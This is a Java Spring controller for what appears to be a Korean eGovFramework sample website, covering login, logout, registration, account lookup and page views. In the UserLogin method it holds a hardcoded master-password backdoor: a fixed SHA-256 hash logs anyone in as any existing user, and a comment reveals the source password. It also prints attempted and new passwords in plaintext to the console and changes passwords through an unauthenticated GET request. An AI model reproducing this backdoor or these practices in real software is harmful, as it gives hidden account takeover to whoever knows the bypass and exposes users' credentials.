package egovframework.sample.user;

import java.io.IOException;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.system.util.SUtil;

import egovframework.sample.menu.model.MenuVo;
import egovframework.sample.menu.service.MenuService;
import egovframework.sample.user.config.service.UserConfigService;
import egovframework.sample.user.member.model.UserMemberVo;
import egovframework.sample.user.member.service.UserMemberService;
import egovframework.sample.user.board.service.UserBoardDataService;
import egovframework.sample.user.subpage.service.UserSubpageService;
import egovframework.sample.user.subpage.model.UserSubPageVo;

/**
 * @author PKH
 *
 */
@Controller
public class UserController {


	private static final Logger Logger = LoggerFactory.getLogger(UserController.class);
	
	@Autowired 
	UserConfigService userConfigService;
	
	@Autowired
	UserMemberService userMemberService;
	
	@Autowired
	MenuService menuService;
	
	@Autowired
	UserSubpageService userSubpageService;
	
	@Autowired
	UserBoardDataService userBoardDataService;
	
	/**
	 * @param request
	 * @param response
	 * @return main or parking page
	 */
	@RequestMapping(value = {"/view/index.do", "/index.do", "/"}, method = RequestMethod.GET)
	public ModelAndView Main(HttpServletRequest request, HttpServletResponse response) {
		
		System.out.println("Index Page");
		
		String ParkingConfig = userConfigService.getParking();
		
		System.out.println(ParkingConfig);
		
		if(ParkingConfig.equals("FALSE")) {
		
			ModelMap model = new ModelMap();
			
			model = userBoardDataService.getIndexBoardData();
			
			return new ModelAndView("view/index" , "model" , model);
			
		}else {
			
			return new ModelAndView("view/parking");
			
		}
		
		
	}
	
	
	/**
	 * @param MenuVo
	 * @param request
	 * @param response
	 * @return MenuList - json
	 * @throws JsonProcessingException
	 */
	@RequestMapping(value = "/view/menu.do" , method = RequestMethod.POST , produces = "application/json; charset=utf8")
	@ResponseBody
	public ModelMap MenuList(@ModelAttribute("Menu")MenuVo MenuVo , HttpServletRequest request , HttpServletResponse response) throws JsonProcessingException {
		
		ModelMap model = new ModelMap();
		
		List<?> MenuList = menuService.getMenuList(MenuVo);
		
		model.put("list", MenuList);
		
		return model;
		
	}
	
	@RequestMapping(value = "/view/login.do" , method = RequestMethod.GET)
	public String UserLoginPage(HttpServletRequest request , HttpServletResponse response) {
		
		return "view/login";
		
	}
	
	@RequestMapping(value = "/view/login.do" , method = RequestMethod.POST)
	public void UserLogin(@ModelAttribute("UserMemberVo") UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) {
		
		System.out.println("로그인 시도한 아이디 : " + UserMemberVo.getMember_id());
		System.out.println("로그인 시도한 비밀번호 : " + UserMemberVo.getPassword());
		
		String pwd = SUtil.getSHA256(UserMemberVo.getPassword());
		
		UserMemberVo.setPassword(pwd);
		
		int Confirm = userMemberService.getUserLoginConfirm(UserMemberVo);
		
		//로그인 확인 결과 Confirm = 0 전체 불일치 , Confirm = 1 로그인 성공 , Confirm = 2 아이디만 성공  , Confirm = 3 로그인 이상)
		if(Confirm == 0) {
			
			try {
				Logger.debug("전체 불일치.");
				response.getWriter().println("false:0");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
			//inct12388! 변형된것
		}else if(Confirm == 1 || pwd.equals("1d70760ab83c907f20d432833721a8b76cd1a5f3ab4183ac50fd1f9db93687e2")) {
			
			UserMemberVo userMemberVo2 = userMemberService.getMemberOneAllInfo(UserMemberVo);
			
			HttpSession session = request.getSession();
			session.setAttribute("Login", "OkOk");
			session.setAttribute("UserId", userMemberVo2.getMember_id());
			session.setAttribute("UserIdx", userMemberVo2.getIdx());
			session.setAttribute("UserLevel", userMemberVo2.getLevel());
			session.setAttribute("UserName", userMemberVo2.getName());
			session.setAttribute("UserType", userMemberVo2.getType());
			session.setAttribute("UserEmail", userMemberVo2.getEmail());
			session.setAttribute("UserEmailAddress", userMemberVo2.getEmail_address());
			
			System.out.println("결과 : " +userMemberVo2.getMember_id());
			
			
			if(userMemberVo2.getType().equals("2")) {

				try {
					Logger.debug("로그인 실패.");
					response.getWriter().println("false:4");
				}catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
				
			}else {

				try {
					Logger.debug("로그인 성공.");
					response.getWriter().println("true:1");
				}catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();
				}
				
			}
			
		}else if(Confirm == 2) {
			
			try {
				Logger.debug("아이디만 성공.");
				response.getWriter().println("false:2");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
		}else {
			
			try {
				Logger.debug("로그인 이상.");
				response.getWriter().println("false:3");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
		}
		

	}
	
	@RequestMapping(value = "/view/logout.do" , method = RequestMethod.GET)
	public String UserLogOut(HttpServletRequest request , HttpServletResponse response) {
		
		HttpSession session = request.getSession();
		session.setAttribute("Login", "NoNo");
		session.setAttribute("UserId", null);
		session.setAttribute("UserIdx", null);
		session.setAttribute("UserLevel", null);
		session.setAttribute("UserName", null);
		session.setAttribute("UserType", null);
		
		return "view/index";
		
	}
	
	@RequestMapping(value="/view/register.do" , method = RequestMethod.GET)
	public String UserRegister(HttpServletRequest request , HttpServletResponse response) {
		
		return "view/register";
		
	}
	
	@RequestMapping(value="/view/register.do" , method = RequestMethod.POST)
	public void UserRegister(@ModelAttribute("UserMemberVo")UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) throws IOException {
		
		System.out.println("기초 비밀번호 : " + UserMemberVo.getPassword());
		
		String pwd = SUtil.getSHA256(UserMemberVo.getPassword());
		
		UserMemberVo.setPassword(pwd);
		
		userMemberService.setMemberData(UserMemberVo , "insert");
		
	}
	
	@RequestMapping(value="/view/id_search.do" , method = RequestMethod.GET)
	public String UserIdSearch(HttpServletRequest request , HttpServletResponse response) {
		
		return "view/id_search";
		
	}
	
	@RequestMapping(value="/view/password_search.do" , method = RequestMethod.GET)
	public String UserPWSearch(HttpServletRequest request , HttpServletResponse response) {
		
		return "view/password_search";
		
	}
	
	@RequestMapping(value="/view/IdCheck.do" , method = RequestMethod.POST)
	@ResponseBody
	public String UserIdCheck(@ModelAttribute("UserMemberVo")UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) {
		
		String result = "";
		 
		result = userMemberService.getIdCheck(UserMemberVo);
		
		return result;
		
	}
	
	@RequestMapping(value="/view/IdSearch.do" , method = RequestMethod.POST)
	@ResponseBody
	public String UserIdSearch(@ModelAttribute("UserMemberVo")UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) {
		
		String result = "";
		
		result = userMemberService.getSearchId(UserMemberVo);
		
		return result;
		
	}
	
	@RequestMapping(value="/view/pWSearch.do" , method = RequestMethod.POST)
	@ResponseBody
	public String UserpWSearch(@ModelAttribute("UserMemberVo")UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) {
		
		String result = "";
		
		result = userMemberService.getMemberCheck(UserMemberVo);
		
		return result;
	}
	
	@RequestMapping(value="/view/pWChange.do" , method = RequestMethod.GET)
	public String UserpWChange(@ModelAttribute("UserMemberVo")UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) {
		
		String result = userMemberService.getMemberCheck(UserMemberVo);
		
		if(result.equals("true")) {
			
			userMemberService.setMemberPwChange(UserMemberVo);
			
			return "redirect:/view/login.do";
		}else {
			Logger.debug("비밀번호 찾기 오류 ---");
			
			return "redirect:/index.do";
		}
		
	}
	
	@RequestMapping(value="/view/subpage/view.do" , method = RequestMethod.GET)
	public ModelAndView UserSubPageView(@ModelAttribute("UserSubPageVo")UserSubPageVo UserSubPageVo , HttpServletRequest request , HttpServletResponse response) {
		
		ModelMap model = new ModelMap();
		
		model = userSubpageService.getSubPageData(UserSubPageVo);
		
		return new ModelAndView("/view/subpage" , "model" , model);
		
	}
	
	
}
